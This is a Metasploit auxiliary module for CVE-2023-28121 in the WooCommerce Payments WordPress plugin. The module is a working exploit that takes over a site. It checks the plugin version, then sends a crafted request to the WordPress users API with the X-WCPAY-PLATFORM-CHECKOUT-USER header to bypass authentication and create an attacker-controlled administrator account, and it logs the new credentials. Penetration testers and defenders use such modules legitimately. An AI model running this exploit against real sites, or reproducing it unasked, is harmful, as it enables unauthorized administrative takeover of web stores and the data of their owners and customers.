##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation',
        'Description' => %q{
          WooCommerce-Payments plugin for Wordpress contains an authentication bypass by specifing a valid user ID number
          within the `X-WCPAY-PLATFORM-CHECKOUT-USER` header.  With this authentication bypass, a user can then use the API
          to create a new user with administartive privileges IF the user ID selected was also an administrator.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Michael Mazzolini', # original discovery
          'Julien Ahrens' # detailed writeup
        ],
        'References' => [
          [ 'URL', 'https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/'],
          [ 'URL', 'https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/'],
          [ 'CVE', '2023-28121']
        ],
        'DisclosureDate' => '2023-03-22',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('USERNAME', [ true, 'User to create', '']),
        OptString.new('PASSWORD', [ false, 'Password to create, random if blank', '']),
        OptString.new('EMAIL', [ false, 'Email to create, random if blank', '']),
        OptInt.new('ADMINID', [ false, 'ID Number of an administrative user', 1]),
        OptString.new('TARGETURI', [ true, 'The URI of the Wordpress instance', '/'])
      ]
    )
  end

  def check
    unless wordpress_and_online?
      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
    end

    checkcode = check_plugin_version_from_readme('woocommerce-payments', '5.6.2')
    if checkcode == Msf::Exploit::CheckCode::Safe
      return Msf::Exploit::CheckCode::Safe('WooCommerce-Payments version not vulnerable')
    end

    checkcode
  end

  def run
    if datastore['PASSWORD'].blank?
      password = Rex::Text.rand_text_alphanumeric(10..15)
    else
      password = datastore['PASSWORD']
    end
    if datastore['EMAIL'].blank?
      email = Rex::Text.rand_mail_address
    else
      email = datastore['EMAIL']
    end
    print_status("Attempting to create administrator -> #{datastore['USERNAME']}:#{password} (#{email})")
    [nil, 'index.php'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),
        'headers' => { "X-WCPAY-PLATFORM-CHECKOUT-USER": datastore['ADMINID'] },
        'method' => 'POST',
        'ctype' => 'application/json',
        'data' => {
          'username' => datastore['USERNAME'],
          'email' => email,
          'password' => password,
          'roles' => ['administrator']
        }.to_json
      })
      fail_with(Failure::Unreachable, 'Connection failed') unless res
      next if res.code == 404

      if res.code == 201
        print_good('User was created successfully')
        if framework.db.active
          create_credential_and_login({
            address: rhost,
            port: rport,
            protocol: 'tcp',
            workspace_id: myworkspace_id,
            origin_type: :service,
            service_name: 'Wordpress',
            private_type: :password,
            module_fullname: fullname,
            access_level: 'administrator',
            status: Metasploit::Model::Login::Status::SUCCESSFUL
          })
        end
      else
        print_error("Server response: #{res.body}")
      end
      break # we didn't get a 404 so we can bail on the 2nd attempt
    end
  end

end
